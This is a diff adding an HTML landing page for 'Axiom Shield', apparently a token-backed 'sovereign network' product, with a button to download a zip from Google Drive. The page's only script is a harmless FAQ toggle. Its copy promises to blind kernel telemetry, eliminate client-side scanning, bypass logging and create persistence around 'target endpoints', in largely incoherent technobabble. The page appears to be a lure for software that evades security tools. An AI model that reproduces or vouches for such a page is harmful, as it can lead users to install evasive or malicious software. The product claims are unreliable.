@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom | The Sovereign Network</title>
+    <link rel="stylesheet" href="landing.css">
+    <style>
+        /* დამატებითი სტილები სტრუქტურისთვის, რომ კოდი კომპაქტური იყოს */
+        .features-grid { max-width: 1200px; margin: 60px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 40px; }
+        .f-card { border: 1px solid var(--border-thin); padding: 30px; border-radius: 12px; background: var(--bg-card); }
+        .f-card h3 { font-size: 20px; margin-bottom: 12px; }
+        .f-card p { font-size: 14px; color: var(--text-muted); }
+        .faq-section { max-width: 800px; margin: 100px auto; padding: 0 20px; }
+        .faq-section h2 { font-size: 32px; text-align: center; margin-bottom: 40px; letter-spacing: -1px; }
+        .faq-item { border-bottom: 1px solid var(--border-thin); padding: 20px 0; }
+        .faq-trigger { background: none; border: none; width: 100%; text-align: left; color: var(--text-primary); font-size: 18px; font-weight: 700; cursor: pointer; display: flex; justify-content: space-between; }
+        .faq-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; color: var(--text-muted); font-size: 15px; margin-top: 10px; }
+        .faq-item.active .faq-content { max-height: 200px; }
+        footer { text-align: center; padding: 40px; color: var(--text-muted); font-size: 14px; border-top: 1px solid var(--border-thin); margin-top: 100px; }
+    </style>
+</head>
+<body>
+
+    <!-- Premium Navigation -->
+    <nav class="nav-container">
+        <div class="logo-text">A<span class="logo-x">X</span>IOM</div>
+        <div style="color: var(--text-muted); font-size: 14px; font-weight: 600;">Status: Devnet Array v1.0.0</div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>Your Apps. Your Network.<br><span style="color: var(--gray-light);">No Interceptors.</span></h1>
+        <p>Enforce hyper-isolated client sandboxing. Blind kernel telemetry sweeps and eliminate local client-side scanning loops automatically.</p>
+        <a href="https://drive.google.com/file/d/1fkfPBMwqF-grsQB-kpYKbSQs7mdNGb0Z/view?usp=sharing" class="btn-download">Download Axiom-Shield.zip</a>
+    </section>
+
+    <!-- Features Section Starts Below -->
+    <div class="features-grid">
+        <!-- Feature Cards -->
+        <div class="f-card">
+            <h3>Hyper-Isolated Sandbox</h3>
+            <p>Deploys persistent memory perimeters locally, isolating sandboxed apps from host device diagnostic sweeps.</p>
+        </div>
+        <div class="f-card">
+            <h3>MTProto Integration</h3>
+            <p>Direct cryptographic handshake arrays over GramJS routing layer bypass traditional browser logging.</p>
+        </div>
+        <div class="f-card">
+            <h3>Sovereign Nodes</h3>
+            <p>Zero centralized databanks. Distributed network logic powered by independent proxy nodes earning $AXM.</p>
+        </div>
+    </div>
+
+    <!-- FAQ Section -->
+    <section class="faq-section">
+        <h2>Frequently Asked Questions</h2>
+        
+        <div class="faq-item">
+            <button class="faq-trigger"><span>What is Axiom Shield?</span><span>+</span></button>
+            <div class="faq-content">
+                <p>Axiom is a sovereign desktop workspace engine built to insulate secure communication pipelines from host-level device metrics and analytical diagnostic overlays.</p>
+            </div>
+        </div>
+
+        <div class="faq-item">
+            <button class="faq-trigger"><span>Does Axiom modify external networks?</span><span>+</span></button>
+            <div class="faq-content">
+                <p>No. Axiom runs strictly at the client level on your hardware. It creates independent persistence sandboxes around target endpoints, isolating native storage layers.</p>
+            </div>
+        </div>
+
+        <div class="faq-item">
+            <button class="faq-trigger"><span>How does the $AXM Ledger function?</span><span>+</span></button>
+            <div class="faq-content">
+                <p>Axiom relies on zero centralized hosting. Nodes are run by anonymous operators globally who route encrypted traffic packages and clear active assets into their balance.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>Axiom Core Framework &copy; 2026. Built for Digital Sovereignty. Fully Non-Commercial.</p>
+    </footer>
+
+    <!-- Interactive FAQ Script -->
+    <script>
+        document.querySelectorAll('.faq-trigger').forEach(trigger => {
+            trigger.addEventListener('click', () => {
+                const parent = trigger.parentElement;
+                const isActive = parent.classList.contains('active');
+                
+                document.querySelectorAll('.faq-item').forEach(item => {
+                    item.classList.remove('active');
+                    item.querySelector('.faq-content').style.maxHeight = '0px';
+                });
+
+                if (!isActive) {
+                    parent.classList.add('active');
+                    const content = parent.querySelector('.faq-content');
+                    content.style.maxHeight = content.scrollHeight + 'px';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
